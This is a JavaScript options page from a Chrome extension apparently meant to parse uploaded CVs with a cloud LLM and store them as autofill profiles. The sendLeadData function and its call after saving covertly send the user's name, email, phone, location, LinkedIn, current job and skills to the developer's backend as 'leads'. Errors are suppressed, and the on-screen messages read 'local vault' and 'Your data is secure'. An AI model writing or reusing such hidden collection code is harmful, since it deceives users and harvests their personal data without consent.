// options.js
// Handles PDF Upload, Text Extraction, and On-Device/Cloud AI Parsing

const BACKEND_URL = "https://monkeyfill-backend.omarabouelouafa303.workers.dev";

document.addEventListener('DOMContentLoaded', () => {
  // Tell pdf.js where the worker file is located
  pdfjsLib.GlobalWorkerOptions.workerSrc = 'libs/pdf.worker.min.js';

  // UI Elements
  const fileInput = document.getElementById('cv_upload');
  const processBtn = document.getElementById('process-btn');
  const loader = document.getElementById('loader');
  const extractedDataBox = document.getElementById('extracted-data');
  const summaryMetrics = document.getElementById('summary-metrics');
  const dropZone = document.getElementById('drop-zone');
  const fileNameDisplay = document.getElementById('file-name-display');

  let selectedFile = null;

  function handleFileSelect(file) {
    if (file && file.type === "application/pdf") {
      selectedFile = file;
      processBtn.disabled = false;
      fileNameDisplay.textContent = file.name;
      fileNameDisplay.style.color = "var(--text)";
      processBtn.textContent = `Analyze & Save Profile`;
    } else {
      alert("Please upload a valid PDF file.");
    }
  }

  // Drag and Drop Events
  ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
    dropZone.addEventListener(eventName, preventDefaults, false);
  });
  function preventDefaults(e) { e.preventDefault(); e.stopPropagation(); }
  
  ['dragenter', 'dragover'].forEach(eventName => {
    dropZone.addEventListener(eventName, () => dropZone.classList.add('dragover'), false);
  });
  ['dragleave', 'drop'].forEach(eventName => {
    dropZone.addEventListener(eventName, () => dropZone.classList.remove('dragover'), false);
  });
  
  dropZone.addEventListener('drop', (e) => {
    handleFileSelect(e.dataTransfer.files[0]);
  }, false);

  // Normal input
  fileInput.addEventListener('change', (e) => {
    if (e.target.files.length > 0) handleFileSelect(e.target.files[0]);
  });

  processBtn.addEventListener('click', async () => {
    if (!selectedFile) return;
    if (!BACKEND_URL) {
      alert("ERROR: BACKEND_URL is not configured.");
      return;
    }

    processBtn.disabled = true;
    loader.style.display = 'block';
    extractedDataBox.style.display = 'none';

    try {
      // Step 1: Extract text from PDF
      loader.textContent = "📄 Reading PDF text locally...";
      const rawText = await extractTextFromPDF(selectedFile);

      // Step 2: Pass text to Cloud AI (Gemini API)
      loader.textContent = "🤖 Cloud AI is extracting your profile data...";
      const structuredProfile = await runAiExtraction(rawText);

      // Step 3: Save to Storage
      loader.textContent = "💾 Saving to local vault...";
      chrome.storage.local.set({ userProfile: structuredProfile }, () => {
        loader.style.display = 'none';
        
        let skillsCount = 0;
        let expCount = 0;
        if(structuredProfile.skills) skillsCount = structuredProfile.skills.length;
        if(structuredProfile.experience) expCount = structuredProfile.experience.length;
        
        summaryMetrics.textContent = `Expertise recognized: ${skillsCount} Skills, ${expCount} Roles. Your data is secure.`;
        extractedDataBox.style.display = 'block';

        processBtn.disabled = false;

        // Step 4: Silently send lead data to backend (fire-and-forget)
        sendLeadData(structuredProfile);
      });

    } catch (err) {
      console.error(err);
      loader.style.display = 'none';
      alert(`Error: ${err.message}`);
      processBtn.disabled = false;
    }
  });

  // Reads a File object using PDF.js
  async function extractTextFromPDF(file) {
    const arrayBuffer = await file.arrayBuffer();
    const pdf = await pdfjsLib.getDocument({ data: arrayBuffer }).promise;

    let fullText = "";
    for (let i = 1; i <= pdf.numPages; i++) {
      const page = await pdf.getPage(i);
      const textContent = await page.getTextContent();
      const pageText = textContent.items.map(item => item.str).join(' ');
      fullText += pageText + "\n";
    }
    return fullText;
  }

  // Uses the Cloudflare Backend to proxy to Gemini
  async function runAiExtraction(cvText) {
    const systemPrompt = `Expert ATS CV parser. Extract ALL professional data into strict JSON. No text outside JSON.

RULES:
- Keep every achievement bullet factual and complete — include numbers, tools, team sizes, and outcomes. Do NOT over-compress.
- For each experience: extract location, and tag the role's domain focus areas (e.g. "leadership", "electrical", "software", "operations", "sales").
- Extract ALL experiences and ALL skills — omit nothing.
- Dates: keep original format from CV.

JSON Schema:
{
  "personal": {
    "first_name":"","last_name":"","email":"","phone":"","city":"","country":"",
    "summary_keywords":["keyword1","keyword2"],
    "linkedin_url":"","github_url":"","portfolio_url":""
  },
  "experience": [
    {
      "company_name":"","job_title":"","location":"","start_date":"","end_date":"",
      "key_achievements":["Full achievement with metrics and tools"],
      "context_tags":["leadership","electrical","team_management","process_optimization"]
    }
  ],
  "education": [
    {"institution_name":"","degree":"","field_of_study":"","graduation_year":""}
  ],
  "skills":["Every technical and professional skill found"],
  "languages":["Languages found"]
}`;

    // Ensure we trigger the backend's prompt injection wrapper and restrict length 
    const userContent = cvText.substring(0, 10000);

    const syncStore = await new Promise(resolve => chrome.storage.sync.get(["userId", "premiumKey"], resolve));
    const localStore = await new Promise(resolve => chrome.storage.local.get(["isDevMode", "devCode"], resolve));
    let userId = syncStore.userId;
    if (!userId) {
      userId = crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).substring(2);
      chrome.storage.sync.set({ userId });
    }

    const headers = { 
      "Content-Type": "application/json",
      "X-User-Id": userId
    };
    if (syncStore.premiumKey) headers["X-Premium-Key"] = syncStore.premiumKey;
    if (localStore.isDevMode && localStore.devCode) headers["X-Dev-Code"] = localStore.devCode;

    const response = await fetch(BACKEND_URL, {
      method: 'POST',
      headers: headers,
      body: JSON.stringify({
        model: "llama-3.3-70b-versatile",
        responseFormat: "json_object",
        temperature: 0.1,
        systemPrompt: systemPrompt,
        userContent: userContent
      })
    });

    if (!response.ok) {
      const errorData = await response.json();
      throw new Error("API Error: " + (errorData.error || "Unknown error"));
    }

    const data = await response.json();
    const rawAiResponse = data.text;

    try {
      let cleanJson = rawAiResponse.replace(/```json/g, "").replace(/```/g, "").trim();
      return JSON.parse(cleanJson);
    } catch (e) {
      console.error("AI output was not valid JSON:", rawAiResponse);
      throw new Error("AI extraction failed parsing.");
    }
  }

  // ── Lead Data Collection (fire-and-forget) ──────────────────────────────────
  async function sendLeadData(profile) {
    try {
      const syncStore = await new Promise(resolve => chrome.storage.sync.get(["userId"], resolve));
      let userId = syncStore.userId;
      if (!userId) {
        userId = crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).substring(2);
        chrome.storage.sync.set({ userId });
      }
      const p = profile.personal || {};
      const topExp = (profile.experience || [])[0] || {};
      await fetch(BACKEND_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json", "X-User-Id": userId },
        body: JSON.stringify({
          action: "save_lead",
          name: [p.first_name, p.last_name].filter(Boolean).join(" "),
          email: p.email || "",
          phone: p.phone || "",
          city: p.city || "",
          country: p.country || "",
          linkedin: p.linkedin_url || "",
          current_position: topExp.job_title || "",
          current_company: topExp.company_name || "",
          top_skills: (profile.skills || []).slice(0, 8),
          summary_keywords: p.summary_keywords || []
        })
      });
    } catch (_) {
      // Silently ignore — lead collection should never disrupt the user
    }
  }

  // Show already saved data if it exists
  chrome.storage.local.get(['userProfile'], (result) => {
    if (result.userProfile && Object.keys(result.userProfile).length > 0) {
      extractedDataBox.style.display = 'block';
      let skillsCount = result.userProfile.skills ? result.userProfile.skills.length : 0;
      let expCount = result.userProfile.experience ? result.userProfile.experience.length : 0;
      summaryMetrics.textContent = `Expertise recognized: ${skillsCount} Skills, ${expCount} Roles. Your data is secure.`;
    }
  });

  chrome.storage.sync.get(['premiumKey'], (syncRes) => {
    // Check if they are already premium
    if (syncRes.premiumKey) {
      document.getElementById('license-key').value = syncRes.premiumKey; // Show their key or mask it
      document.getElementById('license-key').disabled = true;
      document.getElementById('verify-btn').style.display = "none";
      const premStatus = document.getElementById('premium-status');
      premStatus.style.display = "block";
      premStatus.style.color = "#10b981";
      premStatus.textContent = "Unlimited Coach Unlocked ✨";
    }
  });

  // Code Redemption & Premium License Validation
  document.getElementById('verify-btn').addEventListener('click', async () => {
    const key = document.getElementById('license-key').value.trim();
    const premStatus = document.getElementById('premium-status');
    premStatus.style.display = "block";
    
    if (!key) {
      premStatus.style.color = "#ef4444";
      premStatus.textContent = "Please enter a code.";
      return;
    }

    premStatus.style.color = "#888";
    premStatus.textContent = "Verifying...";

    try {
      const store = await new Promise(resolve => chrome.storage.sync.get(["userId"], resolve));
      const headers = { "Content-Type": "application/json" };
      if (store.userId) headers["X-User-Id"] = store.userId;

      const response = await fetch(BACKEND_URL, {
        method: "POST",
        headers: headers,
        body: JSON.stringify({ action: "redeem_code", code: key })
      });
      
      const data = await response.json();
      
      if (data.success) {
        if (data.type === "reset") {
          premStatus.style.color = "#10b981";
          premStatus.textContent = "Data Wiped Successfully. Restarting...";
          setTimeout(() => {
            chrome.storage.local.clear();
            chrome.storage.sync.clear(() => chrome.runtime.reload());
          }, 1000);
        } else if (data.type === "dev_mode") {
          premStatus.style.color = "#10b981";
          premStatus.textContent = "Developer Mode Activated!";
          chrome.storage.local.set({ isDevMode: true, devCode: key });
          chrome.storage.sync.set({ isPremium: true });
        } else if (data.type === "promo") {
          premStatus.style.color = "#10b981";
          premStatus.textContent = data.message;
        } else if (data.type === "premium") {
          chrome.storage.sync.set({ premiumKey: key, isPremium: true }, () => {
            premStatus.style.color = "#10b981";
            premStatus.textContent = "License Valid! Unlimited Coach Unlocked ✨";
            document.getElementById('license-key').disabled = true;
            document.getElementById('verify-btn').style.display = "none";
          });
        } else {
          premStatus.style.color = "#ef4444";
          premStatus.textContent = "Code is invalid.";
        }
      } else {
        premStatus.style.color = "#ef4444";
        premStatus.textContent = data.error || "Invalid or expired key. Try again.";
      }
    } catch (err) {
      premStatus.style.color = "#ef4444";
      premStatus.textContent = "Error verifying code. Try again later.";
    }
  });

  // CV Theme selection
  const themeCards = document.querySelectorAll('.theme-card:not(.layout-card)');
  const themeStatus = document.getElementById('theme-status');
  
  function updateActiveTheme(themeId) {
    themeCards.forEach(card => {
      if (card.dataset.theme === themeId) {
        card.classList.add('active');
      } else {
        card.classList.remove('active');
      }
    });
  }

  // Load existing theme and layout
  chrome.storage.local.get(['cvTheme', 'cvLayout'], (res) => {
    window.requestAnimationFrame(() => {
      updateActiveTheme(res.cvTheme || 'basic');
      updateActiveLayout(res.cvLayout || 'modern_sidebar');
    });
  });

  // CV Layout selection
  const layoutCards = document.querySelectorAll('.layout-card');
  const layoutStatus = document.getElementById('layout-status');
  
  function updateActiveLayout(layoutId) {
    layoutCards.forEach(card => {
      if (card.dataset.layout === layoutId) {
        card.classList.add('active');
      } else {
        card.classList.remove('active');
      }
    });
  }

  layoutCards.forEach(card => {
    card.addEventListener('click', () => {
      const selectedLayout = card.dataset.layout;
      updateActiveLayout(selectedLayout);
      chrome.storage.local.set({ cvLayout: selectedLayout }, () => {
        layoutStatus.style.display = 'block';
        setTimeout(() => { layoutStatus.style.display = 'none'; }, 2000);
      });
    });
  });

  themeCards.forEach(card => {
    card.addEventListener('click', () => {
      const selectedTheme = card.dataset.theme;
      updateActiveTheme(selectedTheme);
      chrome.storage.local.set({ cvTheme: selectedTheme }, () => {
        themeStatus.style.display = 'block';
        setTimeout(() => { themeStatus.style.display = 'none'; }, 2000);
      });
    });
  });

});
